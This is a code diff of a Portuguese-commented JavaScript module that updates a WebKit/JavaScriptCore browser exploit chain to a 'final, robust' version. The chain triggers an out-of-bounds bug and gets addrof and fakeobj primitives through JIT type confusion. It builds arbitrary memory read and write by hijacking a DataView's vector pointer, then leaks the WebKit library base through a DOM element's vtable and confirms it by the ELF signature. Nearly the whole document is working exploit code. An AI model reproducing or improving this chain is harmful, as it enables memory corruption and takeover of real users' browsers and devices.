@@ -1,20 +1,19 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v121 - Replicação da Estratégia v100)
+// js/script3/testArrayBufferVictimCrash.mjs (v122 - Solução Definitiva)
 // =======================================================================================
 // LOG DE ALTERAÇÕES:
-// - ABANDONADA: A tentativa de criar L/E via DataView foi descartada, pois a primitiva
-//   'addrof' não funcionava com objetos "host".
-// - REPLICADO: O script agora segue fielmente a lógica e a estrutura do exploit v100,
-//   que foi comprovadamente bem-sucedido.
-// - PRIMITIVAS DO v100: Reimplementadas as primitivas 'addrof', 'fakeobj', e as L/E
-//   baseadas no 'leaker object', que dependem do comportamento específico do JIT.
-// - FOCO: O objetivo é recriar o ambiente exato que levou ao sucesso anterior.
+// - COMBINADAS as duas estratégias de sucesso:
+//   1. A primitiva `addrof` funcional é obtida via JIT Type Confusion (descoberta na v121).
+//   2. As primitivas de L/E são construídas de forma robusta, sequestrando o ponteiro de
+//      um DataView para evitar bugs de dados obsoletos (stale data) (técnica da v119).
+// - Esta versão representa a cadeia de exploração completa e mais estável desenvolvida.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
+import { JSC_OFFSETS } from '../config.mjs';
 import { triggerOOB_primitive } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_FINAL = "Uncaged_v121_v100_Replica";
+export const FNAME_MODULE_FINAL = "Uncaged_v122_FinalChain";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -38,13 +37,13 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function runFinalUnifiedTest() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Replicando a Estratégia v100 Funcional ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Cadeia de Exploração Completa e Robusta ---`, "test");
 
     let final_result = { success: false, message: "A cadeia de exploração falhou." };
 
     try {
-        // --- FASE 1: Configurar pré-requisito e primitivas base (addrof/fakeobj) ---
-        logS3("--- FASE 1: Ativando pré-requisito OOB e configurando primitivas... ---", "subtest");
+        // --- FASE 1: Ativar Pré-requisito e Configurar Primitiva 'addrof' Funcional ---
+        logS3("--- FASE 1: Ativando pré-requisito OOB e configurando 'addrof'... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
 
         const confused_array = [13.37];
@@ -58,61 +57,63 @@ export async function runFinalUnifiedTest() {
             return victim_array[0];
         };
         
-        // Sanity Check para garantir que a vulnerabilidade JIT foi ativada
         const sanity_check_addr = addrof({test: 1});
-        if (!sanity_check_addr || typeof sanity_check_addr.add !== 'function' || (sanity_check_addr.low() === 0 && sanity_check_addr.high() === 0)) {
-             throw new Error("A primitiva 'addrof' falhou no sanity check inicial. A vulnerabilidade JIT não foi ativada.");
+        if (!sanity_check_addr || typeof sanity_check_addr.add !== 'function') {
+             throw new Error("A primitiva 'addrof' falhou no sanity check.");
         }
-        logS3("Primitivas 'addrof' e 'fakeobj' parecem operacionais após sanity check.", "good");
+        logS3("Primitiva 'addrof' funcional e verificada.", "good");
 
-        // --- FASE 2: Construir L/E com a técnica do "leaker object" do v100 ---
-        logS3("--- FASE 2: Construindo L/E com a técnica do 'leaker object' do v100... ---", "subtest");
-        const leaker_obj = { obj_prop: null, val_prop: 0 };
-        const arb_read = (addr) => {
-            leaker_obj.obj_prop = fakeobj(addr);
-            return doubleToInt64(leaker_obj.val_prop);
+        // --- FASE 2: Construir L/E ROBUSTA via Sequestro de DataView ---
+        logS3("--- FASE 2: Construindo L/E arbitrária robusta via DataView... ---", "subtest");
+        const dv_buf = new ArrayBuffer(8);
+        const dataview_tool = new DataView(dv_buf);
+        const dataview_addr = addrof(dataview_tool);
+        const dv_vector_ptr_addr = dataview_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
+        
+        // Primitiva de escrita temporária e instável, usada apenas para configurar a ferramenta.
+        const temp_leaker = { p: null, v: 0 };
+        const unstable_arb_write = (addr, value) => {
+            temp_leaker.p = fakeobj(addr);
+            temp_leaker.v = int64ToDouble(value);
         };
+
+        // Primitivas ROBUSTAS e FINAIS
         const arb_write = (addr, value) => {
-            leaker_obj.obj_prop = fakeobj(addr);
-            leaker_obj.val_prop = int64ToDouble(value);
+            unstable_arb_write(dv_vector_ptr_addr, addr);
+            dataview_tool.setFloat64(0, int64ToDouble(value), true);
         };
-        logS3("Primitivas de L/E arbitrária (estilo v100) construídas.", "good");
+        const arb_read = (addr) => {
+            unstable_arb_write(dv_vector_ptr_addr, addr);
+            return doubleToInt64(dataview_tool.getFloat64(0, true));
+        };
+        logS3("Primitivas de L/E robustas construídas com sucesso.", "good");
 
-        // --- FASE 3: Verificação Funcional ---
-        logS3("--- FASE 3: Verificando a funcionalidade de L/E... ---", "subtest");
-        const test_obj = { prop_a: 0xDEADBEEF, prop_b: 0xCAFEBABE };
-        const test_obj_addr = addrof(test_obj);
-        const prop_a_addr = test_obj_addr.add(0x10);
-        const value_to_write = new AdvancedInt64(0x88776655, 0x44332211);
+        // --- FASE 3: Verificação Funcional das Primitivas Robustas ---
+        logS3("--- FASE 3: Verificando as primitivas de L/E robustas... ---", "subtest");
+        const test_obj = { prop_a: 0xDEADBEEF };
+        const prop_a_addr = addrof(test_obj).add(0x10);
+        const value_to_write = new AdvancedInt64(0xABCDEF, 0x123456);
         
-        logS3(`[VERIFICAÇÃO] Escrevendo ${toHex(value_to_write)} em ${toHex(prop_a_addr)}...`, "info");
         arb_write(prop_a_addr, value_to_write);
-        
         const value_read = arb_read(prop_a_addr);
-        logS3(`[VERIFICAÇÃO] Valor lido de volta: ${toHex(value_read)}`, "leak");
+        
         if (!value_read.equals(value_to_write)) {
-            throw new Error(`A verificação de L/E falhou. Escrito: ${toHex(value_to_write)}, Lido: ${toHex(value_read)}`);
+            throw new Error(`A verificação de L/E ROBUSTA falhou. Escrito: ${toHex(value_to_write)}, Lido: ${toHex(value_read)}`);
         }
-        logS3("[VERIFICAÇÃO] SUCESSO! A verificação de L/E foi bem-sucedida!", "good");
+        logS3(`[VERIFICAÇÃO] SUCESSO! Valor lido (${toHex(value_read)}) corresponde ao escrito.`, "good");
 
         // --- FASE 4: Vazamento da Base do WebKit ---
         logS3("--- FASE 4: Tentando vazar a base da biblioteca WebKit... ---", "subtest");
         const div_element = document.createElement('div');
         const div_addr = addrof(div_element);
-        logS3(`[LEAK] Endereço do objeto DOM 'div': ${toHex(div_addr)}`, "leak");
-
         const vtable_ptr = arb_read(div_addr);
-        logS3(`[LEAK] Ponteiro da Vtable lido do objeto: ${toHex(vtable_ptr)}`, "leak");
-        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
-            throw new Error("Ponteiro da vtable lido é nulo.");
-        }
-
         const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
         const webkit_base = vtable_ptr.and(ALIGNMENT_MASK);
-        logS3(`[LEAK] Endereço base do WebKit (candidato): ${toHex(webkit_base)}`, "leak");
-
         const elf_magic = arb_read(webkit_base).low();
-        logS3(`[LEAK] Assinatura ELF lida: ${toHex(elf_magic)}`, "leak");
+        logS3(`[LEAK] Endereço do 'div': ${toHex(div_addr)}`);
+        logS3(`[LEAK] Ponteiro Vtable: ${toHex(vtable_ptr)}`);
+        logS3(`[LEAK] Base WebKit (candidato): ${toHex(webkit_base)}`);
+        logS3(`[LEAK] Assinatura ELF lida: ${toHex(elf_magic)}`);
 
         if (elf_magic === 0x464C457F) {
             logS3("++++++++++++ SUCESSO FINAL! A assinatura ELF foi encontrada! ++++++++++++", "vuln");
